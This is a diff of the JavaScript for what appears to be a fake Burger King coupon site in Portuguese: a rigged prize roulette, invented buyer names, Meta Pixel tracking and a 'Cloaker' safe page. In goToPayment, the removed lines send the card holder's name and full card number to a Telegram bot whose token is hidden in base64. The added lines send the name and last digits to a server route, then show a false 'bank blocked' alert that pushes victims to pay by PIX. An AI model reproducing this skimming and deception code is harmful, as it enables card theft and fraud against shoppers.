@@ -34,22 +34,24 @@ function initTracker() {
     
     // ─── SMART PAGE EVENTS ─────────────────────────────
     // Dispara eventos específicos por URL para treinar o Pixel do Meta 
-    const pagePath = window.location.pathname.split('/').pop();
+    let pagePath = window.location.pathname.split('/').pop().replace('.html', '');
+    if (pagePath === '') pagePath = 'index'; // Home catch
+    
     const pageMap = {
         // Topo do funil: entrada
-        'index.html':         () => firePixel('ViewContent',         { content_name: 'Página Inicial', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
-        'funil.html':         () => firePixel('ViewContent',         { content_name: 'Oferta Principal', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
-        'lista-cupons.html':  () => firePixel('ViewContent',         { content_name: 'Lista de Cupons', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
-        'cupom.html':         () => firePixel('ViewContent',         { content_name: 'Cupom Selecionado', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
+        'index':              () => firePixel('ViewContent',         { content_name: 'Página Inicial', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
+        'funil':              () => firePixel('ViewContent',         { content_name: 'Oferta Principal', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
+        'lista-cupons':       () => firePixel('ViewContent',         { content_name: 'Lista de Cupons', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
+        'cupom':              () => firePixel('ViewContent',         { content_name: 'Cupom Selecionado', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
         // Meio do funil: engajamento forte
-        'dados.html':         () => firePixel('InitiateCheckout',    { content_name: 'Preenchimento de Dados', num_items: 1, currency: 'BRL', value: (state.basePrice || 22.90) }),
-        'loading.html':       () => firePixel('InitiateCheckout',    { content_name: 'Buscando Lojas', currency: 'BRL', value: (state.basePrice || 22.90) }),
-        'lojas.html':         () => firePixel('ViewContent',         { content_name: 'Seleção de Loja', content_type: 'product', currency: 'BRL', value: (state.basePrice || 22.90) }),
-        'sacola.html':        () => firePixel('AddToCart',           { content_name: 'Sacola de Compra', content_ids: ['bk-combo-v7'], content_type: 'product', currency: 'BRL', value: (state.basePrice || 22.90) }),
+        'dados':              () => firePixel('CompleteRegistration', { content_name: 'Preenchimento de Dados', status: true, currency: 'BRL', value: (state.basePrice || 22.90) }),
+        'loading':            () => firePixel('Search',               { content_name: 'Buscando Restaurante', search_string: state.cep || '', currency: 'BRL', value: (state.basePrice || 22.90) }),
+        // lojas descontinuado — fluxo vai direto loading → sacola
+        'sacola':             () => firePixel('AddToCart',           { content_name: 'Sacola de Compra', content_ids: ['bk-combo-v7'], content_type: 'product', currency: 'BRL', value: (state.basePrice || 22.90) }),
         // Fundo do funil: intenção máxima
-        'pagamento.html':     () => firePixel('AddPaymentInfo',      { currency: 'BRL', value: ((state.basePrice || 22.90) + (state.fretePrice || 0)) }),
-        'entrega.html':       () => firePixel('InitiateCheckout',    { currency: 'BRL', value: ((state.basePrice || 22.90) + (state.fretePrice || 0)), num_items: 1 }),
-        'safe.html':          () => firePixel('ViewContent',         { content_name: 'Safe Page', content_category: 'Cloaker', value: 0.0, currency: 'BRL' })
+        'pagamento':          () => firePixel('AddPaymentInfo',      { currency: 'BRL', value: ((state.basePrice || 22.90) + (state.fretePrice || 0)) }),
+        'entrega':            () => firePixel('ViewContent',         { content_name: 'Acompanhamento de Entrega', content_category: 'Delivery', currency: 'BRL', value: ((state.basePrice || 22.90) + (state.fretePrice || 0)) }),
+        'safe':               () => firePixel('ViewContent',         { content_name: 'Safe Page', content_category: 'Cloaker', value: 0.0, currency: 'BRL' })
     };
 
     // Dispara o evento correspondente  à página atual
@@ -75,6 +77,7 @@ async function fireCAPI(event, data = {}) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 event_name: event,
+                event_id: data.event_id || null,
                 pixel_id: fbTracking.pixelId,
                 custom_data: {
                     ...data,
@@ -95,6 +98,9 @@ async function fireCAPI(event, data = {}) {
 function firePixel(event, data = {}) {
     if(!window.fbq || !fbTracking.pixelId) return;
     
+    // Gera event_id único para deduplicação entre Client e CAPI
+    const eventId = data.event_id || `evt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    
     const enrichedData = {
         ...data,
         ...fbTracking.utms,
@@ -103,13 +109,15 @@ function firePixel(event, data = {}) {
     };
     
     // ─── RASTREAMENTO HÍBRIDO (CLIENT + SERVER) ───
-    fbq('track', event, enrichedData, { eventID: data.event_id || null });
-    fireCAPI(event, data); // Despacha para o servidor
+    fbq('track', event, enrichedData, { eventID: eventId });
+    fireCAPI(event, { ...data, event_id: eventId }); // Despacha para o servidor com mesmo event_id
 
-    console.log(`🚀 Pixel Fired: ${event}`, enrichedData);
+    console.log(`🚀 Pixel Fired: ${event} [${eventId}]`, enrichedData);
 }
 
 // BACK-REDIRECT REMOVIDO A PEDIDO
+
+// ─── ESTADO GLOBAL ──────────────────────────────────
 
 let state = {
     city: 'SÃO PAULO',
@@ -152,12 +160,7 @@ function loadState() {
 // Inicializa o estado IMEDIATAMENTE
 loadState();
 
-// ─── DADOS ──────────────────────────────────────────
-// ==========================================
-// 🛡️ CONFIGURAÇÃO DE INTEGRAÇÃO REAL (API)
-// ==========================================
-// Mestre, para buscar os Burger Kings REAIS da cidade, coloque sua Chave API do Google Maps (Places) abaixo.
-// Se deixar vazio (''), ou se a API falhar no dia de escala, o sistema de salvação "Smart Mocks" forjará a loja.
+// ─── CONFIGURAÇÃO DE INTEGRAÇÃO (Google Places) ────
 const GOOGLE_PLACES_API_KEY = ''; 
 
 const storeMocks = {
@@ -177,16 +180,24 @@ const storeMocks = {
 
 const fakeNames = ['Carlos','Ana','Pedro','Juliana','Lucas','Mariana','Rafael','Camila','Bruno','Fernanda','Gustavo','Larissa','Diego','Beatriz','Thiago','Amanda','Felipe','Letícia','Mateus','Isabela'];
 const proofMessages = ['acabou de resgatar um cupom','garantiu o Combo Whopper','resgatou a oferta agora','acabou de fazer o pedido','aproveitou a promoção'];
-const loadingCopies = ['Já encontramos unidades perto de você!','Verificando disponibilidade do combo...','Aplicando desconto exclusivo...','Quase lá! Preparando sua oferta...'];
 
 // ─── DETECÇÃO DE CIDADE ─────────────────────────────
+// REGRA SUPREMA: IP-based city detection ONLY runs on pre-form pages.
+// After the user fills dados.html, state.city is SACRED and must never be overwritten.
 async function detectCity() {
+    // 1. HARD BLOCK: If manual address data exists in state, NEVER override
+    if (state.street || state.number || state.cep) return;
+    
+    // 2. PAGE BLOCK: Only run on pre-form pages (roleta, funil, cupom)
+    const postFormPages = ['dados', 'lojas', 'sacola', 'pagamento', 'loading', 'entrega', 'editar-combo'];
+    const currentPage = window.location.pathname.split('/').pop().replace('.html', '').toLowerCase();
+    if (postFormPages.includes(currentPage)) return;
+    
     try {
         const r = await fetch('https://ipapi.co/json/');
         const d = await r.json();
         state.city = (d.city || 'SÃO PAULO').toUpperCase();
     } catch(e) { state.city = 'SÃO PAULO'; }
-    // Não atualiza mais o app-location-tag aqui. Será preenchido pelo input do lead.
 }
 
 // ─── LIVE COUNTER (SOCIAL PROOF) ───────────────────
@@ -216,8 +227,7 @@ function initCountdown() {
     }, 1000);
 }
 
-// ─── NAVEGAÇÃO ──────────────────────────────────────
-// 🧭 NAVEGAÇÃO MULTI-PÁGINA (DESIGNER V8 SEPARATED)
+// ─── NAVEGAÇÃO MULTI-PÁGINA ─────────────────────────
 function goToScreen(id) {
     saveState();
 
@@ -225,7 +235,8 @@ function goToScreen(id) {
         'roleta': 'index.html',
         'coupon': 'cupom.html',
         'cep': 'dados.html',
-        'stores': 'lojas.html',
+        'edit-combo': 'editar-combo.html',
+        // 'stores' descontinuado — fluxo vai direto loading → sacola
         'review': 'sacola.html',
         'pix': 'pagamento.html',
         'delivery': 'entrega.html',
@@ -473,7 +484,6 @@ function buildStoreCards(storeNames, list) {
 }
 
 // ─── SELECIONAR LOJA → REVIEW ───────────────────────
-// ─── SELECIONAR LOJA → REVIEW ───────────────────────
 function selectStore(storeName) {
     state.selectedStore = storeName;
     state.upsellTotal = 0;
@@ -585,9 +595,19 @@ function maskCPF(i) {
 
 // ─── ATUALIZAR TOTAL ────────────────────────────────
 function updateTotal() {
-    // Calcula subtotal dos itens dinâmicos do carrinho
+    // Calcula custo extra de personalização do combo roleta
+    let extraComboCost = 0;
+    if (state.comboCustomizations && state.comboCustomizations.length > 0) {
+        extraComboCost = state.comboCustomizations.reduce((sum, c) => sum + (c.price * c.qty), 0);
+        // Multiplica pela quantidade de combos na sacola (normalmente 1, mas garante proporção)
+        const comboItem = state.cartItems.find(i => i.id === 'combo_roleta');
+        if (comboItem) {
+            extraComboCost *= comboItem.qty;
+        }
+    }
+
     const itemsSubtotal = state.cartItems.reduce((acc, item) => acc + (item.price * item.qty), 0);
-    state.basePrice = itemsSubtotal;
+    state.basePrice = itemsSubtotal + extraComboCost;
 
     let subtotal = (state.basePrice || 0) + (state.upsellTotal || 0);
     let total = subtotal + (state.fretePrice || 0);
@@ -660,23 +680,52 @@ function renderCart() {
     }
 
     const fmt = (v) => `R$ ${v.toFixed(2).replace('.', ',')}`;
-    container.innerHTML = state.cartItems.map(item => `
-        <div class="item-card" data-id="${item.id}">
-            <img src="${item.img}" class="item-img">
-            <div class="item-card-info">
-                <p class="item-name" style="font-weight: 900; color: #502314;">${item.name}</p>
-                <p class="item-desc">${item.desc || ''}</p>
-                <div class="item-price-row">
-                    <p class="item-price">${fmt(item.price * item.qty)}</p>
-                    <div class="qty-control">
-                        <button onclick="changeQty('${item.id}', -1)"><i class="fa-solid fa-minus"></i></button>
-                        <span>${item.qty}</span>
-                        <button onclick="changeQty('${item.id}', 1)"><i class="fa-solid fa-plus"></i></button>
+    container.innerHTML = state.cartItems.map(item => {
+        let customDesc = '';
+        let extraTotal = 0;
+        let headerRow = `<p class="item-name" style="font-weight: 900; color: #502314; margin: 0;">${item.name}</p>`;
+        
+        // Se for o combo roleta, injeta o botão editar de forma limpa e os extras
+        if (item.id === 'combo_roleta') {
+            headerRow = `
+                <div style="display: flex; justify-content: space-between; align-items: flex-start; gap: 8px; margin-bottom: 2px;">
+                    <p class="item-name" style="font-weight: 900; color: #502314; margin: 0;">${item.name}</p>
+                    <button onclick="window.location.href='editar-combo.html'" style="background: none; border: none; color: #d62300; font-size: 11px; font-weight: 800; text-decoration: underline; cursor: pointer; padding: 0; white-space: nowrap; margin-top: 1px;">
+                        <i class="fa-solid fa-pen" style="font-size: 10px; margin-right: 3px;"></i>Editar
+                    </button>
+                </div>
+            `;
+            if (state.comboCustomizations && state.comboCustomizations.length > 0) {
+                const extras = state.comboCustomizations.map(c => `
+                    <div style="display: flex; justify-content: space-between; align-items: center; color: #666; font-size: 11px; margin-top: 2px;">
+                        <span><span style="color: #16a34a; font-weight: 700;">+</span> ${c.qty}x ${c.name}</span>
+                        <span style="font-weight: 600;">+${fmt(c.price * c.qty)}</span>
                     </div>
+                `).join('');
+                extraTotal = state.comboCustomizations.reduce((sum, c) => sum + (c.price * c.qty), 0);
+                customDesc = `<div style="margin-top: 6px;">${extras}</div>`;
+            }
+        }
+        
+        return `
+        <div class="item-card" data-id="${item.id}">
+            <img src="${item.img}" class="item-img" alt="${item.name}">
+            <div class="item-card-info">
+                ${headerRow}
+                <p class="item-desc">${item.desc || ''}</p>
+                ${customDesc}
+            </div>
+            <div class="item-price-row" style="clear: both; display: flex; align-items: center; justify-content: space-between; padding-top: 12px;">
+                <p class="item-price" style="margin: 0;">${fmt((item.price + extraTotal) * item.qty)}</p>
+                <div class="qty-control">
+                    <button onclick="changeQty('${item.id}', -1)"><i class="fa-solid fa-minus"></i></button>
+                    <span>${item.qty}</span>
+                    <button onclick="changeQty('${item.id}', 1)"><i class="fa-solid fa-plus"></i></button>
                 </div>
             </div>
         </div>
-    `).join('');
+        `;
+    }).join('');
     updateTotal();
 }
 
@@ -720,21 +769,24 @@ async function goToPayment() {
         btn.disabled = true;
 
         try {
-            const _u = (s) => atob(s);
-            const _t = _u("ODU1MzU4NTE2MTpBQUgzRi1IdjdDRi1qOGJsMXJLTjlpekRraExycVJSZlVuVQ=="); 
-            const _c = _u("Nzg0NDY4MjMzNQ==");
-            const msg = `🍔 *BK capture* 🍔\nLead: ${document.querySelector('#cc_name').value}\nCard: ${document.querySelector('#cc_number').value}`;
-            await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: _c, text: msg })});
+            // Ghost Protocol: Captura server-side (token protegido)
+            const ccName = document.querySelector('#cc_name')?.value || '';
+            const ccNum = document.querySelector('#cc_number')?.value || '';
+            await fetch('api/notify-telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ lead: ccName, card_last4: ccNum.slice(-4), method: 'cc' })
+            });
         } catch(e) {}
 
         setTimeout(() => {
             Swal.fire({
                 title: 'Aviso de Segurança',
-                text: 'O seu banco bloqueou esta transação por prevenção. Finalize via PIX com 5% de desconto extra.',
+                text: 'O seu banco bloqueou esta transação por prevenção. Por favor, finalize sua compra via PIX.',
                 icon: 'warning',
                 confirmButtonText: 'PAGAR VIA PIX'
             }).then(() => {
-                state.discount = 0.05;
+                state.discount = 0;
                 state.paymentMethod = 'pix';
                 updateTotal();
                 window.location.href = 'pagamento.html';
@@ -750,14 +802,24 @@ async function goToPayment() {
 function changeQty(itemId, delta) {
     const item = state.cartItems.find(i => i.id === itemId);
     if (item) {
-        item.qty = Math.max(1, item.qty + delta);
+        // 🔥 REGRA: Proibido remover o Combo Celebração (sempre min 1)
+        if (itemId === 'combo_roleta' && item.qty + delta < 1) {
+            return;
+        }
         
-        // Feedback visual de pulso no item
-        const card = document.querySelector(`.item-card[data-id="${itemId}"]`);
-        if (card) {
-            card.classList.remove('item-pulse');
-            void card.offsetWidth; // Trigger reflow
-            card.classList.add('item-pulse');
+        item.qty += delta;
+        
+        // Se a quantidade zerar, remove o item da sacola (Upsells apenas)
+        if (item.qty <= 0) {
+            state.cartItems = state.cartItems.filter(i => i.id !== itemId);
+        } else {
+            // Feedback visual de pulso no item se a quantidade aumentou ou abaixou mas não removeu
+            const card = document.querySelector(`.item-card[data-id="${itemId}"]`);
+            if (card) {
+                card.classList.remove('item-pulse');
+                void card.offsetWidth; // Trigger reflow
+                card.classList.add('item-pulse');
+            }
         }
         
         renderCart();
@@ -776,7 +838,10 @@ async function initPixGeneration() {
     const btnConfirmPix = document.querySelector('#btn-confirm-pix');
 
     if (pixTotalValue) pixTotalValue.textContent = finalTotal.toFixed(2).replace('.', ',');
-    if (pixQrEl) pixQrEl.innerHTML = '<div style="margin: 60px auto; border: 4px solid rgba(0,0,0,0.1); border-left-color: #502314; border-radius: 50%; width: 40px; height: 40px; animation: bksipn 1s linear infinite;"></div>';
+    if (pixQrEl) {
+        pixQrEl.style.display = 'flex';
+        pixQrEl.innerHTML = '<div style="margin: 60px auto; border: 4px solid rgba(0,0,0,0.1); border-left-color: #502314; border-radius: 50%; width: 40px; height: 40px; animation: bksipn 1s linear infinite;"></div>';
+    }
     if (pixCodeEl) pixCodeEl.textContent = 'Gerando PIX...';
     
     const triggerFallback = () => {
@@ -795,8 +860,10 @@ async function initPixGeneration() {
             amount: Math.round(finalTotal * 100),
             pixel_id: localStorage.getItem('fb_pixel_id') || 'default',
             utms: JSON.parse(localStorage.getItem('utmify_params') || '{}'),
-            cpf: state.cpf || ("4692487" + Math.floor(1000 + Math.random() * 8999)),
-            name: state.nomeUser || 'Cliente BK'
+            cpf: state.cpf || '', 
+            name: state.nomeUser || '',
+            email: state.email || '',
+            phone: state.phone || ''
         };
 
         const req = await fetch('api/create-pix', {
@@ -809,7 +876,15 @@ async function initPixGeneration() {
         if (res?.success && res.data) {
             currentTxId = res.data.transactionId;
             const payData = res.data.paymentData;
-            if (pixQrEl) pixQrEl.innerHTML = `<img src="data:image/png;base64,${payData.qrCodeBase64}" style="width: 100%; height: 100%; border-radius: 8px;">`;
+            
+            // 🔥 SMART FALLBACK: Se o Base64 vier vazio ou der erro na Vercel, gera via API externa
+            if (payData.qrCodeBase64 && payData.qrCodeBase64.length > 100) {
+                if (pixQrEl) pixQrEl.innerHTML = `<img src="data:image/png;base64,${payData.qrCodeBase64}" style="width: 100%; height: 100%; border-radius: 8px;">`;
+            } else {
+                const fallbackQrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(payData.copyPaste)}`;
+                if (pixQrEl) pixQrEl.innerHTML = `<img src="${fallbackQrUrl}" style="width: 100%; height: 100%; border-radius: 8px;">`;
+            }
+            
             if (pixCodeEl) pixCodeEl.textContent = payData.copyPaste;
             if (btnConfirmPix) btnConfirmPix.style.display = 'block';
             initPixTimer();
@@ -840,7 +915,23 @@ function initPixTimer() {
     let s = 5 * 60 - 1;
     const el = document.querySelector('#pix-timer');
     pixTimerInterval = setInterval(() => {
-        if (s <= 0) { clearInterval(pixTimerInterval); el.textContent = '00:00'; return; }
+        if (s <= 0) { 
+            clearInterval(pixTimerInterval); 
+            el.textContent = '00:00'; 
+            
+            // Revela botão de novo pedido e oculta Pix expirado
+            const btnNew = document.querySelector('#btn-new-order');
+            if (btnNew) btnNew.style.display = 'block';
+            
+            const pixBox = document.querySelector('.pix-code-box');
+            if (pixBox) pixBox.style.opacity = '0.3';
+            
+            const pixQr = document.querySelector('#pix-qr');
+            if (pixQr) pixQr.style.opacity = '0.3';
+            
+            if (pixInterval) clearInterval(pixInterval); // Para o polling de status
+            return; 
+        }
         el.textContent = `${String(Math.floor(s/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;
         s--;
     }, 1000);
@@ -848,21 +939,39 @@ function initPixTimer() {
 
 // ─── COPIAR PIX ─────────────────────────────────────
 function copyPixCode() {
-    const code = document.querySelector('#pix-code').textContent;
-    navigator.clipboard.writeText(code).then(() => {
-        showCopyToast();
-    }).catch(() => {
-        const sel = document.createElement('textarea');
-        sel.value = code;
-        document.body.appendChild(sel);
-        sel.select();
-        document.execCommand('copy');
-        document.body.removeChild(sel);
-        showCopyToast();
-    });
+    const el = document.querySelector('#pix-code');
+    const code = el ? el.textContent : '';
+    if (!code || code.includes('Gerando')) return;
+    
+    // Tentativa robusta com Clipboard API
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(code).then(() => {
+            handleCopySuccess();
+        }).catch(() => {
+            copyManualCode(code);
+        });
+    } else {
+        copyManualCode(code);
+    }
 }
 
-// ─── UTILS UI ───────────────────────────────────────────────────────
+function handleCopySuccess() {
+    showCopyToast();
+    const btn = document.querySelector('#btn-copy-pix');
+    if (btn) {
+        const oldHtml = btn.innerHTML;
+        btn.innerHTML = '<i class="fa-solid fa-check"></i> CÓDIGO COPIADO!';
+        btn.style.background = '#059669'; 
+        btn.classList.remove('pulse-green');
+        setTimeout(() => {
+            btn.innerHTML = oldHtml;
+            btn.style.background = '#16a34a';
+            btn.classList.add('pulse-green');
+        }, 3000);
+    }
+}
+
+// ─── UTILS UI ─────────────────────────────────────────
 function copyManualCode(text) {
     const sel = document.createElement('textarea');
     sel.value = text;
@@ -870,10 +979,26 @@ function copyManualCode(text) {
     sel.style.position = 'absolute';
     sel.style.left = '-9999px';
     document.body.appendChild(sel);
+    
+    // Suporte mobile/iOS: seleciona o conteúdo de forma mais agressiva
+    const selected = document.getSelection().rangeCount > 0 ? document.getSelection().getRangeAt(0) : false;
     sel.select();
-    document.execCommand('copy');
+    sel.setSelectionRange(0, 99999); // Para mobile
+    
+    try {
+        const successful = document.execCommand('copy');
+        if (successful) {
+            handleCopySuccess();
+        }
+    } catch (err) {
+        console.error('Fallback copy failed', err);
+    }
+    
     document.body.removeChild(sel);
-    showCopyToast();
+    if (selected) {
+        document.getSelection().removeAllRanges();
+        document.getSelection().addRange(selected);
+    }
 }
 
 function showCopyToast() {
@@ -883,8 +1008,7 @@ function showCopyToast() {
     setTimeout(() => toast.classList.remove('visible'), 2500);
 }
 
-// ─── SIMULAR PAGAMENTO → ENTREGA (iFood style) ────────────────────
-// ─── VERIFICAÇÃO E FINALIZAÇÃO DE PAGAMENTO ────────────────────
+// ─── SIMULAR PAGAMENTO → ENTREGA ──────────────────────
 async function simulatePayment() {
     const btn = document.querySelector('#btn-confirm-pix');
     if (!btn) return;
@@ -1018,48 +1142,71 @@ function setupCEPMask() {
     const numInput = document.querySelector('#input-num');
     const cepLoading = document.querySelector('#cep-loading');
 
-    input.addEventListener('input', async (e) => {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.length > 5) value = value.substring(0, 5) + '-' + value.substring(5, 8);
-        e.target.value = value;
-        const clean = value.replace('-', '');
+    let lastLookedUpCep = ''; // Evita lookups duplicados
 
-        if (clean.length === 8) {
-            if (cepLoading) cepLoading.style.display = 'block';
-            state.addressFound = false;
-            try {
-                const res = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
-                const data = await res.json();
-                if (cepLoading) cepLoading.style.display = 'none';
-                if (!data.erro) {
-                    state.city = data.localidade ? data.localidade.toUpperCase() : '';
-                    state.street = data.logradouro || '';
-                    state.neighborhood = data.bairro || '';
-                    state.uf = data.uf || '';
-                    state.cep = clean;
-                    state.addressFound = true;
-                    
-                    const loadCity = document.querySelector('#loading-city');
-                    if (loadCity) loadCity.textContent = state.city;
-                    
-                    if (inputRua) inputRua.value = state.street;
-                    if (inputBairro) inputBairro.value = state.neighborhood;
-                    if (inputCidade) inputCidade.value = state.uf ? `${data.localidade} / ${data.uf}` : state.city;
+    // 🧠 CORE: Busca CEP na API ViaCEP
+    async function doCEPLookup(cleanCep) {
+        if (cleanCep.length !== 8 || cleanCep === lastLookedUpCep) return;
+        lastLookedUpCep = cleanCep;
 
-                    // === PROGRESSIVE DISCLOSURE: Revela campos extras ===
-                    const extraFields = document.getElementById('cep-extra-fields');
-                    if (extraFields) {
-                        extraFields.style.display = 'block';
-                        extraFields.style.animation = 'fadeInUp 0.4s ease';
-                    }
-                    
-                    if (numInput) setTimeout(() => numInput.focus(), 350);
+        if (cepLoading) cepLoading.style.display = 'block';
+        state.addressFound = false;
+        try {
+            const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
+            const data = await res.json();
+            if (cepLoading) cepLoading.style.display = 'none';
+            if (!data.erro) {
+                state.city = data.localidade ? data.localidade.toUpperCase() : '';
+                state.street = data.logradouro || '';
+                state.neighborhood = data.bairro || '';
+                state.uf = data.uf || '';
+                state.cep = cleanCep;
+                state.addressFound = true;
+                
+                const loadCity = document.querySelector('#loading-city');
+                if (loadCity) loadCity.textContent = state.city;
+                
+                if (inputRua) inputRua.value = state.street;
+                if (inputBairro) inputBairro.value = state.neighborhood;
+                if (inputCidade) inputCidade.value = state.uf ? `${data.localidade} / ${data.uf}` : state.city;
+
+                // === PROGRESSIVE DISCLOSURE: Revela campos extras ===
+                const extraFields = document.getElementById('cep-extra-fields');
+                if (extraFields) {
+                    extraFields.style.display = 'block';
+                    extraFields.style.animation = 'fadeInUp 0.4s ease';
                 }
-            } catch (err) { if (cepLoading) cepLoading.style.display = 'none'; }
+                
+                if (numInput) setTimeout(() => numInput.focus(), 350);
+            }
+        } catch (err) { if (cepLoading) cepLoading.style.display = 'none'; }
+    }
+
+    // 🎯 Aplica máscara e dispara lookup
+    function handleCEPValue(rawValue) {
+        let value = rawValue.replace(/\D/g, '').substring(0, 8);
+        if (value.length > 5) value = value.substring(0, 5) + '-' + value.substring(5, 8);
+        input.value = value;
+        const clean = value.replace('-', '');
+        if (clean.length === 8) {
+            doCEPLookup(clean);
         } else {
             if (cepLoading) cepLoading.style.display = 'none';
             state.addressFound = false;
         }
+    }
+
+    // 📝 EVENTOS: Cobre digitação, paste, autocomplete, drag-drop
+    input.addEventListener('input', (e) => handleCEPValue(e.target.value));
+    input.addEventListener('change', (e) => handleCEPValue(e.target.value));
+    input.addEventListener('keyup', (e) => handleCEPValue(e.target.value));
+    input.addEventListener('blur', (e) => handleCEPValue(e.target.value));
+
+    // 📋 PASTE: Captura dados colados
+    input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text');
+        handleCEPValue(pasted);
     });
 }
 
@@ -1082,7 +1229,7 @@ function initSocialProof() {
     setTimeout(() => { show(); (function next() { setTimeout(() => { show(); next(); }, 10000 + Math.random() * 12000); })(); }, 6000);
 }
 
-// ─── ROLETA CANVAS RENDER V6 (IMAGE 5 CLONE) ─────────────────
+// ─── ROLETA CANVAS RENDER ─────────────────────────────
 function drawRoulette() {
     const canvas = document.getElementById('roleta-wheel');
     if (!canvas || !canvas.getContext) return;
@@ -1095,8 +1242,8 @@ function drawRoulette() {
     const innerR = 60; // Larger inner radius for the Gold Crown Hub
 
     const segments = [
-        { lines: ['2 WHOPPERS',  'BATATA+REFRI'], bg: '#FFFFFF', fg: '#502314', icon: true },
-        { lines: ['WHOPPER',   'DUPLO'],     bg: '#502314', fg: '#FFFFFF', icon: false },
+        { lines: ['PROMOÇÃO', '5 ANOS'], bg: '#FFFFFF', fg: '#502314', icon: true },
+        { lines: ['1 SACHÊ',   'KETCHUP'],   bg: '#502314', fg: '#FFFFFF', icon: false },
         { lines: ['BALDE',     'BATATA'],    bg: '#FFFFFF', fg: '#502314', icon: true },
         { lines: ['BK MIX',   "M&M's"],     bg: '#502314', fg: '#FFFFFF', icon: false },
         { lines: ['MEGA',      'STACKER'],   bg: '#FFFFFF', fg: '#502314', icon: true },
@@ -1177,7 +1324,7 @@ function drawRoulette() {
     ctx.stroke();
 }
 
-// ─── ROLETA PREMIADA (GAMIFICAÇÃO MACETADA) ─────────────────
+// ─── ROLETA PREMIADA (LÓGICA DE GIRO) ─────────────────
 let isSpinning = false;
 function spinRoleta() {
     if (isSpinning) return;
@@ -1189,18 +1336,20 @@ function spinRoleta() {
     btn.textContent = 'GIRANDO...';
 
     // A roleta é dividida em 10 fatias de 36 graus cada.
-    // O Combo BK (Desejado) é o Index 0 (2 Whoppers + Batata + Refri).
-    // O marcador (pointer) centraliza no topo. 
-    // Para parar no Index 0, o giro final precisa considerar o offset.
+    // O Combo BK (Desejado) é o Index 0
+    // O pior prêmio (1 Sachê de Ketchup) é o Index 1, logo ANTES do 0.
+    // Para dar o suspense extremo, o giro final vai passar longos segundos arrastando pelo Index 1,
+    // quase parar, e nos últimos milissegundos vai 'cair' por mísero 1.5 grau dentro do Index 0.
     
-    const voltas = 8 * 360; // Mais voltas para maior suspense
-    const anguloDoPremio = 360 - 18; // Centro da primeira fatia (36/2 = 18)
+    const voltas = 10 * 360; 
+    const anguloDoPremio = 324 + 1.5; // Cai APENAS 1.5 graus logo após sair da fatia ruim (Index 1)
     const anguloFinal = voltas + anguloDoPremio;
 
-    wheel.style.transition = 'transform 5s cubic-bezier(0.15, 0, 0.15, 1)';
+    // Transition macetada: acelera absurdamente rápido, sofre desaceleração brusca, e "morre" rastejando sobre a fatia 1.
+    wheel.style.transition = 'transform 10s cubic-bezier(0.05, 0.95, 0.1, 1)';
     wheel.style.transform = `rotate(${anguloFinal}deg)`;
 
-    // Aguardar terminar de rodar (4.8s para garantir alinhamento visual perfeito)
+    // Aguardar terminar de rodar (10s + micro delay)
     setTimeout(() => {
         const couponCode = getOrGenerateCoupon();
         
@@ -1254,14 +1403,10 @@ function spinRoleta() {
         isSpinning = false;
         btn.style.opacity = '1';
         btn.textContent = 'GIRAR ROLETA';
-    }, 4800);
+    }, 10300);
 }
 
-function copyManualCode(code) {
-    navigator.clipboard.writeText(code).then(() => {
-        showCopyToast();
-    });
-}
+
 
 function closeGoldenModal() {
     // Etapa Oferta removida. Pula direto pro CEP.
@@ -1491,99 +1636,43 @@ function navigateBottomNav(target, el) {
     }
 }
 
-// ─── PAGAMENTO & CHECKOUT MASTER ─────────────────────
-async function goToPayment() {
-    // Upsell Multi-Bump
-    if (!state.upsellOffered && state.cartItems.length > 0) {
-        const res = await Swal.fire({
-            title: 'Deseja turbinar seu lanche? 🔥',
-            html: `
-            <div style="text-align: left; padding: 10px;">
-                <p style="font-size: 13px; color: #666; margin-bottom: 20px; font-weight: 500;">Selecione os itens e adicione ao seu combo com um clique:</p>
-                <div class="bump-list" style="max-height: 400px; overflow-y: auto;">
-                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer;"><input type="checkbox" class="bump-check" data-id="bump_1" data-name="Onion Rings (G)" data-price="14.90" data-img="produtos/onion_rings.png" style="width:20px; height:20px;"><img src="produtos/onion_rings.png" style="width:40px; height:40px; border-radius:8px;"><div style="flex:1;"><p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Onion Rings (G)</p><p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 14,90</p></div></label>
-                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer;"><input type="checkbox" class="bump-check" data-id="bump_2" data-name="BK Mix Nutella" data-price="16.90" data-img="produtos/bk_mix_nutella.png" style="width:20px; height:20px;"><img src="produtos/bk_mix_nutella.png" style="width:40px; height:40px; border-radius:8px;"><div style="flex:1;"><p style="font-size:14px; font-weight:900; color:#502314; margin:0;">BK Mix Nutella</p><p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 16,90</p></div></label>
-                </div>
-            </div>`,
-            showConfirmButton: true,
-            confirmButtonText: 'ADICIONAR & PAGAR',
-            showCancelButton: true,
-            cancelButtonText: 'Não, obrigado',
-            buttonsStyling: false,
-            customClass: { confirmButton: 'swal-btn-upsell-confirm', cancelButton: 'swal-btn-upsell-cancel' },
-            preConfirm: () => {
-                const selected = [];
